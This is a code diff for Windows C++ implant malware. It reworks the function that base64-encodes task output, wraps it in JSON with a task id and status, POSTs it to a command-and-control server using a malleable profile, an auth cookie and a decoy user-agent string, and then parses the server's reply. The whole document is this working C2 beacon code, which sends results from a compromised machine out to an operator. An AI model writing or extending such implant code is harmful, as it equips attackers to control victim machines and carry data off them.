@@ -1,5 +1,7 @@
 #include <windows.h>
 #include "rapidjson/document.h"
+#include "rapidjson/writer.h"
+#include "rapidjson/stringbuffer.h"
 #include "httpclient.h"
 #include "implant.h"
 #include "crypto.h"
@@ -76,7 +78,7 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     return parseTask(resDecoded);
 }
 
-bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success, MallableProfile *profile)
+bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool success, MalleableProfile *profile)
 {
     /* Payload format:
     {
@@ -88,17 +90,28 @@ bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success, MallableProfile
     */
 
     // JSON encode the results
-    vector<BYTE> results = LPBYTEToVector(results, GetLPBYTELength(results));
-    string resultsB64 = base64Encode(results);
+    string resultsB64 = base64EncodeString(results);
     rapidjson::Document resultsDocument;
+    rapidjson::Value resObj(rapidjson::kObjectType);
     resultsDocument.SetObject();
-    rapidjson::Document::AllocatorType &allocator = resultsDocument.GetAllocator();
-    rapidjson::Value resultsVal(resultsB64.c_str(), allocator);
-    resultsDocument.AddMember("output", resultsVal, allocator);
-    rapidjson::Value tidVal(taskId, allocator);
-    resultsDocument.AddMember("tid", tidVal, allocator);
-    rapidjson::Value statusVal(success, allocator);
-    resultsDocument.AddMember("status", statusVal, allocator);
+    rapidjson::Value resultsVal;
+    resultsVal.SetString(resultsB64.c_str(), resultsDocument.GetAllocator());
+    resultsDocument.AddMember("output", resultsVal, resultsDocument.GetAllocator());
+    rapidjson::Value tidVal;
+    tidVal.SetString(taskId, resultsDocument.GetAllocator());
+    resultsDocument.AddMember("tid", tidVal, resultsDocument.GetAllocator());
+    rapidjson::Value statusVal;
+    statusVal.SetBool(success);
+    resultsDocument.AddMember("status", statusVal, resultsDocument.GetAllocator());
+
+    // resultsDocument.SetObject();
+    // rapidjson::Document::AllocatorType &allocator = resultsDocument.GetAllocator();
+    // rapidjson::Value resultsVal(resultsB64.c_str(), allocator);
+    // resultsDocument.AddMember("output", resultsVal, allocator);
+    // rapidjson::Value tidVal(taskId, allocator);
+    // resultsDocument.AddMember("tid", tidVal, allocator);
+    // rapidjson::Value statusVal(success, allocator);
+    // resultsDocument.AddMember("status", statusVal, allocator);
 
     rapidjson::StringBuffer buffer;
     rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
@@ -115,6 +128,26 @@ bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success, MallableProfile
 
     // Send the results
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", profile->serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
+    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
     
+    DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
+
+    // Parse JSON response
+    rapidjson::Document resDocument;
+    resDocument.Parse(res.c_str());
+
+    if (resDocument.HasParseError())
+    {
+        DEBUG_PRINTF("Error parsing JSON response\n");
+        return false;
+    }
+
+    if (!resDocument["status"].GetBool())
+    {
+        DEBUG_PRINTF("Error sending task results\n");
+        return false;
+    }
+
+    return true;
+
 }
